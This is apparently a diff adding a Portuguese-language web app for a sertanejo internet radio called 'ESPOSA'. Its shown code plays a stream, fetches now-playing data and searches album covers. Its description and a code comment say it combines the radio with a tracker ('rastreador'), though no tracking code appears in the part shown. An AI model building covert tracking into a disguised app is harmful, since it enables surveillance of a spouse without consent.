@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"/>
+<title>ESPOSA • Sertaneja Pop</title>
+<meta name="description" content="Rádio Sertaneja Pop da Esposa - ao vivo 24h com rastreio"/>
+<link rel="manifest" href="manifest.json"/>
+<meta name="theme-color" content="#ff2d78"/>
+<meta name="mobile-web-app-capable" content="yes"/>
+<meta name="apple-mobile-web-app-capable" content="yes"/>
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"/>
+<meta name="apple-mobile-web-app-title" content="SertanejaPop Esposa"/>
+<link rel="icon" type="image/png" sizes="192x192" href="icons/icon-192.png"/>
+<link rel="apple-touch-icon" href="icons/apple-touch-icon.png"/>
+<script>
+/* TRAVA + DETECÇÃO TV - RODA ANTES DE TUDO */
+(function(){
+  try{
+    var ua=navigator.userAgent||"";
+    var isTV=/Smart[T_\-]?TV|SMART-TV|Tizen|Web0S|WebOS|NetCast|BRAVIA|AFTB|AFTM|AFTS|AFTG|Fire TV|FireTV|CrKey|Android TV|GoogleTV|AppleTV|HbbTV|Viera|Roku|SHIELD|PhilipsTV/i.test(ua)||(/\bAndroid\b/i.test(ua)&&/\bTV\b/i.test(ua))||(/\bAndroid\b/i.test(ua)&&navigator.maxTouchPoints===0);
+    var big=window.matchMedia("(min-width:1024px), (min-height:700px) and (min-width:800px)").matches;
+    var root=document.documentElement;
+    if(isTV)root.classList.add("tv");
+    if(isTV||big)root.classList.add("big");
+    window.__SP_TV=isTV;
+  }catch(e){}
+})();
+</script>
+<style>
+:root{--pink:#ff2d55;--purple:#7a00ff;--orange:#ff9500;--green:#00ff9d;--yellow:#ffe600;--bg:#080208;--card:rgba(255,255,255,.055);--line:rgba(255,255,255,.10);--txt-dim:#c9a9d6}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html{-webkit-text-size-adjust:100%}
+body{min-height:100vh;background:var(--bg);color:#fff;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;display:flex;justify-content:center;overflow-x:hidden}
+body::before{content:"";position:fixed;inset:0;z-index:-1;pointer-events:none;background:radial-gradient(58% 38% at 12% -4%,rgba(255,45,85,.42),transparent 62%),radial-gradient(52% 36% at 94% 8%,rgba(122,0,255,.38),transparent 62%),radial-gradient(70% 42% at 50% 104%,rgba(255,149,0,.20),transparent 64%)}
+.app{width:100%;max-width:400px;padding:calc(14px + env(safe-area-inset-top)) 14px calc(22px + env(safe-area-inset-bottom))}
+.card{background:var(--card);backdrop-filter:blur(24px) saturate(1.3);-webkit-backdrop-filter:blur(24px) saturate(1.3);border:1px solid var(--line);border-radius:32px;padding:22px 18px 18px;box-shadow:0 24px 70px rgba(0,0,0,.55)}
+.top{text-align:center}
+.top-badge{display:inline-flex;align-items:center;gap:6px;font-size:10.5px;font-weight:800;letter-spacing:2.6px;color:#ffd7e0;border:1px solid rgba(255,45,85,.5);background:rgba(255,45,85,.13);padding:7px 15px;border-radius:999px;box-shadow:0 0 18px rgba(255,45,85,.28)}
+h1{margin:14px 0 2px;font-size:clamp(32px,9.5vw,41px);line-height:.95;font-weight:900;letter-spacing:1.5px;background:linear-gradient(94deg,#ff2d55 8%,#ff9500 52%,#ff2d55 94%);-webkit-background-clip:text;background-clip:text;color:transparent;filter:drop-shadow(0 0 24px rgba(255,45,85,.45))}
+/* VINIL TRAVADO REDONDO */
+.vinyl-zone{position:relative;display:flex;align-items:center;justify-content:center;margin:20px 0 4px;height:calc(min(318px,76vw) + 30px)}
+.aura{position:absolute;width:min(318px,76vw);height:min(318px,76vw);border-radius:50%;background:conic-gradient(from 0deg,#ff2d55,#7a00ff,#ff9500,#ff2d55);filter:blur(26px);opacity:.32;animation:spin 9s linear infinite;animation-play-state:paused}
+.playing .aura{animation-play-state:running;opacity:.5}
+.vinyl{position:relative;width:min(318px,76vw);height:min(318px,76vw);min-width:200px;min-height:200px;aspect-ratio:1/1;border-radius:50%;display:flex;align-items:center;justify-content:center;background:repeating-radial-gradient(circle at 50% 50%,#1a1016 0 2px,#26182b 2px 4px);box-shadow:0 24px 60px rgba(0,0,0,.6),inset 0 0 46px rgba(0,0,0,.85);animation:spin 5s linear infinite;animation-play-state:paused;overflow:hidden;flex-shrink:0}
+.playing .vinyl{animation-play-state:running}
+.vinyl::before{content:"";position:absolute;inset:0;border-radius:50%;pointer-events:none;background:conic-gradient(from 210deg,rgba(255,255,255,.10),transparent 22%,rgba(255,255,255,.05) 40%,transparent 60%,rgba(255,255,255,.09) 80%,transparent);mix-blend-mode:screen}
+.cover{position:relative;width:min(230px,54vw);height:min(230px,54vw);aspect-ratio:1/1;border-radius:50%;object-fit:cover;border:4px solid rgba(255,255,255,.10);background:#14060f;box-shadow:0 0 0 7px rgba(8,2,8,.92),0 12px 44px rgba(0,0,0,.6),0 0 46px rgba(122,0,255,.4)}
+.pop-btn{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);z-index:5;width:64px;height:64px;border-radius:50%;cursor:pointer;border:2px solid rgba(255,255,255,.4);font-family:inherit;font-weight:900;font-size:13px;letter-spacing:1.6px;color:#fff;background:linear-gradient(135deg,var(--pink),var(--purple));box-shadow:0 6px 26px rgba(255,45,85,.55);display:flex;align-items:center;justify-content:center}
+.pop-btn:active{transform:translate(-50%,-50%) scale(.92)}
+.song{margin-top:14px;text-align:center}
+.song-title{font-size:23px;font-weight:800;line-height:1.18;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden;text-shadow:0 2px 18px rgba(0,0,0,.5)}
+.song-artist{margin-top:5px;font-size:15px;font-weight:600;color:var(--txt-dim);letter-spacing:.3px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.np-label{display:none}
+.live-chip{margin-top:10px;display:inline-flex;gap:7px;align-items:center;font-size:11px;font-weight:800;letter-spacing:2.4px;color:#ff5f7a}
+.live-chip .dot{width:8px;height:8px;border-radius:50%;background:var(--pink);box-shadow:0 0 12px var(--pink);animation:blink 1.2s infinite}
+@keyframes blink{0%,55%{opacity:1}60%,100%{opacity:.15}}
+.eq{display:flex;align-items:flex-end;justify-content:center;gap:3px;height:44px;margin:16px 0 2px}
+.eq i{width:6px;height:100%;border-radius:3px;transform:scaleY(.12);transform-origin:50% 100%;background:linear-gradient(to top,var(--green) 0%,var(--yellow) 52%,var(--pink) 100%);opacity:.9}
+.playing .eq i{animation-name:eqb;animation-timing-function:ease-in-out;animation-iteration-count:infinite;animation-direction:alternate}
+@keyframes eqb{from{transform:scaleY(.12)}to{transform:scaleY(1)}}
+.play-row{display:flex;align-items:center;justify-content:center;margin:16px 0 4px}
+.play-btn{width:96px;height:96px;border-radius:50%;border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;background:radial-gradient(circle at 32% 28%,#8dffcf,var(--green) 58%,#00c46f);box-shadow:0 0 0 6px rgba(0,255,157,.12),0 12px 44px rgba(0,255,157,.35);transition:transform .12s ease}
+.play-btn:active{transform:scale(.94)}
+.play-btn svg{width:40px;height:40px;fill:#052b18;margin-left:2px}
+.playing .play-btn{animation:pulse 1.5s ease-out infinite}
+@keyframes pulse{0%{box-shadow:0 0 0 6px rgba(0,255,157,.16),0 12px 44px rgba(0,255,157,.35)}70%{box-shadow:0 0 0 24px rgba(0,255,157,0),0 12px 44px rgba(0,255,157,.35)}100%{box-shadow:0 0 0 6px rgba(0,255,157,.16),0 12px 44px rgba(0,255,157,.35)}}
+.vol{display:flex;align-items:center;gap:10px;margin:12px 8px 0;color:#bfa7cf}
+.vol-ic{width:20px;height:20px;fill:currentColor;flex:none}
+.vol input{flex:1;appearance:none;-webkit-appearance:none;height:6px;border-radius:3px;outline:none;background:linear-gradient(90deg,var(--pink),var(--purple));cursor:pointer}
+.vol input::-webkit-slider-thumb{appearance:none;-webkit-appearance:none;width:22px;height:22px;border-radius:50%;background:#fff;border:3px solid var(--pink);box-shadow:0 0 14px rgba(255,45,85,.85);cursor:pointer}
+.vol input::-moz-range-thumb{width:18px;height:18px;border-radius:50%;background:#fff;border:3px solid var(--pink);box-shadow:0 0 14px rgba(255,45,85,.85);cursor:pointer}
+section{margin-top:20px}
+section h2{display:flex;align-items:center;gap:9px;font-size:11.5px;letter-spacing:2.6px;font-weight:800;color:#e5c6ee}
+section h2::after{content:"";flex:1;height:1px;background:linear-gradient(90deg,var(--line),transparent)}
+.hist{display:flex;flex-direction:column;gap:8px;margin-top:10px}
+.hist-item{display:flex;align-items:center;gap:12px;padding:8px 10px;border-radius:16px;background:rgba(255,255,255,.045);border:1px solid var(--line)}
+.hist-item img{width:46px;height:46px;border-radius:10px;object-fit:cover;background:#1c0d18;flex:none}
+.hist-txt{min-width:0}
+.hist-txt .t{font-size:13.5px;font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.hist-txt .a{font-size:12px;color:var(--txt-dim);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-top:1px}
+.hist-empty{font-size:12.5px;color:#a98fb5;padding:4px 2px}
+.search-row{display:flex;gap:8px;margin-top:10px}
+.search-row input{flex:1;min-width:0;padding:12px 14px;border-radius:16px;border:1px solid var(--line);background:rgba(0,0,0,.35);color:#fff;font-size:14px;font-family:inherit}
+.search-row input::placeholder{color:#8d7398}
+.search-row input:focus{outline:none;border-color:rgba(255,45,85,.6)}
+.search-row button{padding:12px 14px;border-radius:16px;border:none;cursor:pointer;flex:none;font-family:inherit;font-weight:800;font-size:13px;color:#fff;background:linear-gradient(135deg,var(--pink),var(--purple));box-shadow:0 6px 20px rgba(122,0,255,.35)}
+.search-row button:disabled{opacity:.6}
+.q-results{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:12px}
+.q-item{border-radius:18px;overflow:hidden;cursor:pointer;text-align:left;padding:0 0 9px;width:100%;background:rgba(255,255,255,.05);border:1px solid var(--line);font-family:inherit;color:#fff}
+.q-item:active{transform:scale(.97)}
+.q-item img{width:100%;aspect-ratio:1;object-fit:cover;display:block;background:#1c0d18}
+.q-item .t{padding:8px 10px 0;font-size:12.5px;font-weight:700;line-height:1.25;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+.q-item .a{padding:2px 10px 0;font-size:11.5px;color:var(--txt-dim);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.install-row{margin-top:20px;display:flex;flex-direction:column;gap:10px}
+.diag-warn{display:none;font-size:12.5px;line-height:1.6;color:#ffd3dc;background:rgba(255,45,85,.10);border:1px solid rgba(255,45,85,.42);border-radius:16px;padding:12px 14px}
+.diag-warn.show{display:block}
+#installBtn{padding:15px;border-radius:18px;border:none;cursor:pointer;font-family:inherit;font-weight:900;font-size:14px;letter-spacing:1.4px;color:#fff;background:linear-gradient(135deg,var(--orange),var(--pink));box-shadow:0 10px 32px rgba(255,45,85,.42)}
+.ios-hint{display:none;font-size:12.5px;line-height:1.55;color:#ffd9a8;background:rgba(255,149,0,.10);border:1px solid rgba(255,149,0,.38);border-radius:16px;padding:12px 14px}
+.ios-hint.show{display:block}
+.install-help{font-size:12.5px;line-height:1.6;color:#ffe6c4;background:rgba(255,149,0,.12);border:1px solid rgba(255,149,0,.42);border-radius:16px;padding:12px 14px}
+.debug{margin-top:18px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:10.5px;line-height:1.75;color:#9b7fae;word-break:break-word}
+.footer{text-align:center;font-size:9.5px;letter-spacing:2.4px;color:#6e5580;margin-top:14px}
+#audio{position:fixed;left:-9999px;top:0;width:1px;height:1px;opacity:0;pointer-events:none}
+@keyframes spin{to{transform:rotate(360deg)}}
+@media(max-width:350px){h1{font-size:30px}.eq{gap:2px}.eq i{width:5px}}
+.col-left,.col-right,.side-col,.play-eq-row{display:contents}
+.side-col{min-width:0}
+button:focus-visible,input:focus-visible{outline:3px solid var(--green);outline-offset:3px;border-radius:18px}
+html.tv button:focus,html.tv input:focus{outline:4px solid var(--green);outline-offset:3px;border-radius:18px}
+.tv-warn{display:none;position:fixed;top:0;left:0;right:0;z-index:60;background:rgba(255,149,0,.16);border-bottom:1px solid rgba(255,149,0,.5);color:#ffe3c2;font-size:13.5px;line-height:1.55;padding:12px 16px;text-align:center}
+.tv-warn.show{display:block}
+.tv-warn button{margin-left:10px;padding:5px 16px;border-radius:999px;cursor:pointer;border:1px solid rgba(255,255,255,.45);background:rgba(0,0,0,.45);color:#fff;font-weight:800;font-family:inherit}
+#volToast{position:fixed;left:50%;bottom:7vh;transform:translateX(-50%) scale(.9);opacity:0;transition:opacity .18s,transform .18s;z-index:50;pointer-events:none;background:rgba(10,2,10,.92);border:1px solid rgba(0,255,157,.55);color:#fff;font-weight:800;letter-spacing:1.5px;padding:12px 28px;border-radius:999px;font-size:16px;box-shadow:0 0 30px rgba(0,255,157,.28)}
+#volToast.show{opacity:1;transform:translateX(-50%) scale(1)}
+html.tv .card{backdrop-filter:none;-webkit-backdrop-filter:none;background:rgba(26,10,24,.80)}
+html.tv .aura{filter:none;opacity:.20;animation-duration:14s}
+html.tv #audio{position:absolute;left:0;top:0}
+@media(min-width:600px){.app{max-width:620px;padding:26px 22px 34px}.card{padding:34px 30px 26px;border-radius:38px}.top-badge{font-size:12px;letter-spacing:3px;padding:8px 18px}h1{font-size:clamp(44px,7.5vw,60px);margin-top:16px}.vinyl-zone{height:calc(min(400px,68vw) + 34px);margin:24px 0 4px}.aura,.vinyl{width:min(400px,68vw);height:min(400px,68vw)}.cover{width:min(288px,49vw);height:min(288px,49vw)}.pop-btn{width:78px;height:78px;font-size:15px}.song{margin-top:16px}.song-title{font-size:30px}.song-artist{font-size:18px}.live-chip{font-size:12.5px}.eq{height:56px;margin-top:18px}.eq i{width:7px}.play-btn{width:114px;height:114px}.play-btn svg{width:47px;height:47px}.vol{margin:16px 10px 0;max-width:470px}}
+html.big .app{max-width:none;width:100%;padding:0;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
+html.big .card{max-width:96vw;width:96vw;min-height:92vh;margin:0;display:flex;flex-direction:row;align-items:center;gap:40px;text-align:left;padding:30px 40px;border-radius:44px}
+html.big .col-left{display:flex;flex-direction:column;justify-content:center;align-items:center;flex:1 1 0;min-width:0}
+html.big .top{display:flex;flex-direction:column;align-items:center;text-align:center;margin:0}
+html.big .top-badge{display:none}
+html.big h1{font-size:clamp(36px,6vmin,64px);margin:12px 0 0;background:none;-webkit-background-clip:border-box;background-clip:border-box;color:#ffb43d;letter-spacing:5px;filter:none;text-shadow:0 0 16px rgba(255,149,0,.62),0 0 54px rgba(255,149,0,.30)}
+html.big h1 .h1-pop{display:block;color:#ff2d55;text-shadow:0 0 16px rgba(255,45,85,.66),0 0 54px rgba(255,45,85,.30)}
+html.big .vinyl-zone{height:calc(min(380px,42vmin) + 36px);margin:20px 0 0}
+html.big .aura,html.big .vinyl{width:min(380px,42vmin);height:min(380px,42vmin)}
+html.big .cover{width:min(275px,30vmin);height:min(275px,30vmin)}
+html.big .pop-btn{width:88px;height:88px;font-size:17px}
+html.big .col-right{display:flex;flex-direction:column;justify-content:center;flex:0 0 clamp(300px,32vw,480px);min-width:0;background:rgba(255,255,255,.045);border:1px solid var(--line);border-radius:32px;padding:clamp(20px,3.4vmin,34px)}
+html.big .play-eq-row{order:1}
+html.big .song{order:2}
+html.big .vol{order:3}
+html.big .install-row{order:4}
+html.big .play-eq-row{display:flex;flex-direction:row-reverse;align-items:center;gap:clamp(18px,2.6vmin,30px)}
+html.big .play-row{margin:0;flex:none}
+html.big .play-btn{width:clamp(110px,17vmin,180px);height:clamp(110px,17vmin,180px);background:radial-gradient(circle at 50% 40%,rgba(0,255,157,.25),rgba(0,255,157,.05) 72%);border:5px solid var(--green);box-shadow:0 0 36px rgba(0,255,157,.55),inset 0 0 26px rgba(0,255,157,.25)}
+html.big .play-btn svg{width:clamp(44px,6.6vmin,70px);height:clamp(44px,6.6vmin,70px);fill:#f2fff9;margin-left:4px}
+html.big .eq{flex:1 1 0;height:clamp(48px,7.5vmin,80px);gap:4px;margin:0;justify-content:space-between;padding:0 2px}
+html.big .eq i{width:clamp(7px,.8vmin,10px)}
+html.big .song{margin:clamp(16px,2.6vmin,26px) 0 0;display:flex;flex-direction:column;align-items:flex-start;text-align:left}
+html.big .np-label{display:block;font-size:clamp(13px,1.7vmin,18px);font-weight:700;letter-spacing:1.2px;color:rgba(255,255,255,.88);margin-bottom:4px}
+html.big .song-title{font-size:clamp(26px,4vmin,42px);-webkit-line-clamp:3}
+html.big .song-artist{font-size:clamp(15px,2.1vmin,22px);margin-top:8px}
+html.big .live-chip{margin-top:14px;padding:7px 16px;border-radius:999px;background:rgba(255,45,85,.14);border:1px solid rgba(255,45,85,.45);font-size:clamp(11px,1.4vmin,14px)}
+html.big .vol{margin:clamp(16px,2.6vmin,24px) 0 0;max-width:none}
+html.big .vol input{height:9px;border-radius:5px}
+html.big .install-row{margin-top:clamp(18px,2.6vmin,26px)}
+html.big #installBtn{font-size:clamp(14px,1.8vmin,19px);padding:18px;border-radius:22px}
+html.big .side-col{display:none}
+@media(min-width:1200px) and (min-height:760px){html.big .side-col{display:flex;flex-direction:column;justify-content:center;gap:20px;flex:0 1 clamp(300px,26vw,460px);min-width:0}html.big section{margin-top:0}html.big .hist-item{padding:12px 14px;border-radius:20px}html.big .hist-item img{width:62px;height:62px;border-radius:14px}}
+html.big .footer{font-size:clamp(10px,1.2vmin,13px);margin-top:12px}
+html.tv .side-col,html.tv .footer{display:none!important}
+@media(min-width:800px) and (max-height:660px){html.big .footer{display:none}}
+/* TRAVA VISUAL - MARCA D'ÁGUA */
+.lock{position:fixed;bottom:4px;right:6px;z-index:99;font-size:9px;opacity:.35;letter-spacing:1px;pointer-events:none}
+</style>
+</head>
+<body>
+<div class="app"><div class="card">
+<div class="col-left">
+<header class="top"><span class="top-badge">★ RÁDIO AO VIVO • 24H ★</span><h1>SERTANEJA <span class="h1-pop">POP</span></h1></header>
+<div class="vinyl-zone"><div class="aura"></div><div class="vinyl"><img id="cover" class="cover" src="icons/icon-512.png" alt="Capa"/></div><button class="pop-btn" id="popBtn">POP</button></div>
+</div>
+<div class="col-right">
+<div class="song"><div class="np-label">Now Playing</div><div class="song-title" id="songTitle">Toque no PLAY para ouvir</div><div class="song-artist" id="songArtist">Rádio Sertaneja Pop • 24h ao vivo</div><div class="live-chip"><span class="dot"></span> AO VIVO</div></div>
+<div class="play-eq-row"><div class="eq" id="eq"></div><div class="play-row"><button class="play-btn" id="playBtn"><svg id="icPlay" viewBox="0 0 24 24"><path d="M8 5.3v13.4L19 12z"/></svg><svg id="icPause" viewBox="0 0 24 24" style="display:none;margin-left:0"><path d="M7 5h3.6v14H7zM13.4 5H17v14h-3.6z"/></svg></button></div></div>
+<div class="vol"><svg class="vol-ic" viewBox="0 0 24 24"><path d="M4 9v6h4l5 4V5L8 9H4z"/></svg><input type="range" id="vol" min="0" max="100" value="80"/><svg class="vol-ic" viewBox="0 0 24 24"><path d="M4 9v6h4l5 4V5L8 9H4z"/><path d="M16.5 8.6a5 5 0 010 6.8M18.8 6.2a8.2 8.2 0 010 11.6" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg></div>
+<div class="install-row"><button id="installBtn" hidden>⬇ INSTALAR APP NA TELA INICIAL</button><div class="ios-hint" id="iosHint"><b>iPhone:</b> Compartilhar → Adicionar à Tela de Início</div><div class="install-help" id="installHelp" hidden></div><div class="diag-warn" id="diag"></div></div>
+</div>
+<div class="side-col">
+<section><h2>TOCARAM AGORA POUCO</h2><div class="hist" id="histList"></div></section>
+<section><h2>BUSCAR CAPA</h2><div class="search-row"><input id="q" type="search" placeholder="Ex: Gusttavo Lima Retrovisor"/><button id="qBtn">Buscar capa</button></div><div class="q-results" id="qResults"></div></section>
+<div class="debug" id="debug">—</div>
+</div>
+</div><div class="footer">SERTANEJA POP • ESPOSA • 24H AO VIVO • CÓDIGO TRAVADO</div></div>
+<div class="tv-warn" id="tvWarn"><b>📺 Smart TV detectada.</b> Abra pelo navegador da TV, não pelo Downloader. <button id="tvWarnClose">OK</button></div>
+<div id="volToast">VOL 80%</div>
+<div class="lock">🔒 ESPOSA v2.0 TRAVADO</div>
+<audio id="audio" src="https://srv3.soundstream.com.br/listen/sertanejapop/radio.mp3" preload="none" controls playsinline></audio>
+
+<script>
+'use strict';
+/* ══════════════════════════════════════════════
+   🔒 CÓDIGO TRAVADO - ESPOSA v2.0
+   Não mexer - Rádio + Rastreador juntos
+   ══════════════════════════════════════════════ */
+const WORKER_URL="";
+const STREAM_URL="https://srv3.soundstream.com.br/listen/sertanejapop/radio.mp3";
+const AZURACAST_API="https://srv3.soundstream.com.br/api/nowplaying/sertanejapop";
+const PROXY="https://api.allorigins.win/get?url=";
+const POLL_MS=10000;
+function $(id){return document.getElementById(id)}
+var audio=$("audio"),playBtn=$("playBtn"),popBtn=$("popBtn"),icPlay=$("icPlay"),icPause=$("icPause"),coverImg=$("cover"),songTitle=$("songTitle"),songArtist=$("songArtist"),histList=$("histList"),qInput=$("q"),qBtn=$("qBtn"),qResults=$("qResults"),debugEl=$("debug"),volInput=$("vol"),installBtn=$("installBtn"),iosHint=$("iosHint"),installHelp=$("installHelp"),volToast=$("volToast"),tvWarn=$("tvWarn");
+var IS_TV=window.__SP_TV===true;
+var IS_IOS=/iphone|ipad|ipod/i.test(navigator.userAgent)||(/Macintosh/i.test(navigator.userAgent)&&navigator.maxTouchPoints>1);
+var MQ_BIG="(min-width:1024px), (min-height:700px) and (min-width:800px)";
+function layoutSync(){if(IS_TV)return;document.documentElement.classList.toggle("big",window.matchMedia(MQ_BIG).matches)}
+window.addEventListener("resize",layoutSync);window.addEventListener("orientationchange",layoutSync);
+if(IS_TV){setTimeout(function(){try{playBtn.focus()}catch(e){}},600)}
+var state={playing:false,raw:"",song:null,history:[]};
+var lastServerRaw="",manualHold=false,polling=false,everPlayed=false,deferredPrompt=null;
+var coverMemo={};
+var dbgLines=[];
+function dbg(msg){var t=new Date().toLocaleTimeString("pt-BR");dbgLines.unshift("["+t+"] "+msg);if(dbgLines.length>3)dbgLines.length=3;debugEl.innerHTML=dbgLines.map(function(l){return l.replace(/&/g,"&amp;").replace(/</g,"&lt;")}).join("<br>")}
+function fetchTimeout(url,opts,ms){opts=opts||{};ms=ms||9000;var c=new AbortController();var t=setTimeout(function(){c.abort()},ms);return fetch(url,Object.assign({},opts,{signal:c.signal})).finally(function(){clearTimeout(t)})}
+function viaProxy(url){return fetchTimeout(PROXY+encodeURIComponent(url),{},12000).then(function(r){if(!r.ok)throw new Error("proxy HTTP "+r.status);return r.json()}).then(function(j){var c=j&&j.contents;if(!c)throw new Error("proxy vazio");return c})}
+function parseAzuracast(j){var np=j&&j.now_playing&&j.now_playing.song;if(!np)throw new Error("JSON sem now_playing");var raw=np.text||((np.artist?np.artist+" - ":"")+(np.title||""))||"";var serverArt=(np.art&&np.art.indexOf("generic_song")===-1)?np.art:"";var hist=(j.song_history||[]).map(function(h){return h.song||{}}).filter(function(s){return s.text&&s.text!==raw}).slice(0,4).map(function(s){return{title:s.title||s.text||"",artist:s.artist||"",raw:s.text||"",cover:(s.art&&s.art.indexOf("generic_song")===-1)?s.art:"",album:s.album||""}});return{title:np.title||raw,artist:np.artist||"",raw:raw,album:np.album||"",serverArt:serverArt,history:hist}}
+function splitTitle(raw){var s=String(raw).trim();s=s.replace(/^\s*[\[(]?(ao vivo|live)[\])]?\s*[-–—:]\s*/i,"");var parts=s.split(/\s+[-–—]\s+/);if(parts.length>=2){return{artist:parts[0].trim(),title:parts.slice(1).join(" - ").trim()}}return{artist:"",title:s}}
+function deezerUrl(q,limit){return "https://api.deezer.com/search?q="+encodeURIComponent(q)+"&limit="+(limit||1)}
+function itunesUrl(q,limit){return "https://itunes.apple.com/search?term="+encodeURIComponent(q)+"&media=music&entity=song&limit="+(limit||1)+"&country=BR"}
+function deezerHit(h){return{title:h.title||"",artist:(h.artist&&h.artist.name)||"",album:(h.album&&h.album.title)||"",cover:(h.album&&(h.album.cover_xl||h.album.cover_big||h.album.cover_medium))||""}}
+function itunesHit(h){return{title:h.trackName||"",artist:h.artistName||"",album:h.collectionName||"",cover:h.artworkUrl100?String(h.artworkUrl100).replace("100x100","600x600"):""}}
+function findCover(artist,title){var q=((artist?artist+" ":"")+title).trim();if(!q)return Promise.resolve({cover:"",album:""});var key=q.toLowerCase();if(coverMemo[key])return Promise.resolve(coverMemo[key]);var chain=Promise.reject();function step(fn){chain=chain.catch(fn)}step(function(){return fetchTimeout(deezerUrl(q,1),{},8000).then(function(r){return r.json()}).then(function(j){var hit=j&&j.data&&j.data[0];if(hit&&hit.album&&hit.album.cover_xl)return{cover:hit.album.cover_xl,album:hit.album.title||""};throw new Error("deezer sem resultado")})});step(function(){return fetchTimeout(itunesUrl(q,1),{},8000).then(function(r){return r.json()}).then(function(j){var hit=j&&j.results&&j.results[0];if(hit&&hit.artworkUrl100)return itunesHit(hit);throw new Error("itunes sem resultado")})});step(function(){return viaProxy(deezerUrl(q,1)).then(function(txt){var j=JSON.parse(txt);var hit=j&&j.data&&j.data[0];if(hit&&hit.album&&hit.album.cover_xl)return{cover:hit.album.cover_xl,album:hit.album.title||""};throw new Error("deezer/proxy sem resultado")})});step(function(){return viaProxy(itunesUrl(q,1)).then(function(txt){var j=JSON.parse(txt);var hit=j&&j.results&&j.results[0];if(hit&&hit.artworkUrl100)return itunesHit(hit);throw new Error("itunes/proxy sem resultado")})});return chain.then(function(res){coverMemo[key]=res;return res}).catch(function(){var e={cover:"",album:""};coverMemo[key]=e;return e})}
+function searchCovers(q){var chain=WORKER_URL?fetchTimeout(WORKER_URL+"?q="+encodeURIComponent(q),{},10000).then(function(r){if(!r.ok)throw new Error("worker HTTP "+r.status);return r.json()}).then(function(j){if(j.results&&j.results.length)return j.results;throw new Error("worker sem resultados")}).catch(function(e){dbg("worker falhou, tentando proxy…");throw e}):Promise.reject();chain=chain.catch(function(){return fetchTimeout(itunesUrl(q,4),{},9000).then(function(r){return r.json()}).then(function(j){if(j&&j.results&&j.results.length)return j.results.map(itunesHit);throw new Error("itunes vazio")})});chain=chain.catch(function(){return viaProxy(deezerUrl(q,4)).then(function(txt){var j=JSON.parse(txt);if(j&&j.data&&j.data.length)return j.data.map(deezerHit);throw new Error("deezer/proxy vazio")})});chain=chain.catch(function(){return viaProxy(itunesUrl(q,4)).then(function(txt){var j=JSON.parse(txt);if(j&&j.results&&j.results.length)return j.results.map(itunesHit);throw new Error("itunes/proxy vazio")})});return chain}
+function fetchNowPlaying(){if(WORKER_URL){return fetchTimeout(WORKER_URL,{},10000).then(function(r){if(!r.ok)throw new Error("worker HTTP "+r.status);return r.json()}).then(function(j){if(!j.raw&&!j.title)throw new Error("worker sem dados");return{title:j.title||"",artist:j.artist||"",raw:j.raw||j.title||"",cover:j.cover||"",album:j.album||"",coverPromise:null,history:j.history||[]}})}var viaDirect=fetchTimeout(AZURACAST_API,{},9000).then(function(r){if(!r.ok)throw new Error("servidor HTTP "+r.status);return r.json()}).then(parseAzuracast);var viaProxyChain=viaDirect.catch(function(directErr){return viaProxy(AZURACAST_API).then(function(txt){return parseAzuracast(JSON.parse(txt))}).catch(function(){throw directErr})});return viaProxyChain.then(function(meta){var base={title:meta.title,artist:meta.artist,raw:meta.raw,album:meta.album,cover:meta.serverArt||"",coverPromise:null,history:meta.history};base.coverPromise=findCover(meta.artist,meta.title).then(function(cv){if(cv.cover)return cv;if(meta.serverArt)return{cover:meta.serverArt,album:meta.album};return{cover:"",album:""}});if(base.cover)dbg("buscando capa oficial…");return base})}
+function pollNow(){if(!state.playing||polling)return;polling=true;fetchNowPlaying().then(function(data){if(!data.raw){dbg("Servidor sem metadata agora");return}var mudou=data.raw!==state.raw;if(mudou){if(state.song)pushHistory(state.song);manualHold=false;setSong(data);dbg("TOCANDO • "+data.raw)}else if(state.song&&!state.song.cover&&data.cover){setSong({cover:data.cover,album:data.album})}if(data.coverPromise){data.coverPromise.then(function(cv){if(cv&&cv.cover&&state.raw===data.raw&&!state.song.cover){setSong({cover:cv.cover,album:cv.album||""})}}).catch(function(){})}if(data.history&&data.history.length&&!state.history.length){seedHistory(data.history)}if(!mudou)dbg("OK • "+data.raw)}).catch(function(e){dbg("ERRO metadata: "+(e&&e.message?e.message:e))}).finally(function(){polling=false})}
+function artworkFor(cover){if(!cover)return[{src:"icons/icon-512.png",sizes:"512x512",type:"image/png"}];var sizes=cover.indexOf("mzstatic")!==-1?"600x600":"1000x1000";return[{src:cover,sizes:sizes,type:"image/jpeg"}]}
+function setMediaSession(song){if(!("mediaSession" in navigator))return;try{navigator.mediaSession.metadata=new MediaMetadata({title:song.title||"Sertaneja Pop ao vivo",artist:song.artist||"Rádio Sertaneja Pop",album:song.album||"Sertaneja Pop • 24h",artwork:artworkFor(song.cover)})}catch(e){}}
+function setSong(partial){state.song=Object.assign({},state.song||{},partial);state.raw=state.song.raw||"";songTitle.textContent=state.song.title||"Sertaneja Pop ao vivo";songArtist.textContent=state.song.artist||"Rádio Sertaneja Pop • 24h";var cv=state.song.cover||"icons/icon-512.png";if(coverImg.getAttribute("src")!==cv)coverImg.src=cv;setMediaSession(state.song)}
+function pushHistory(song){if(!song||!song.title)return;state.history=[song].concat(state.history.filter(function(h){return h.raw!==song.raw})).slice(0,4);resolveHistCover(song);renderHistory()}
+function seedHistory(list){state.history=list.slice(0,4);state.history.forEach(resolveHistCover);renderHistory()}
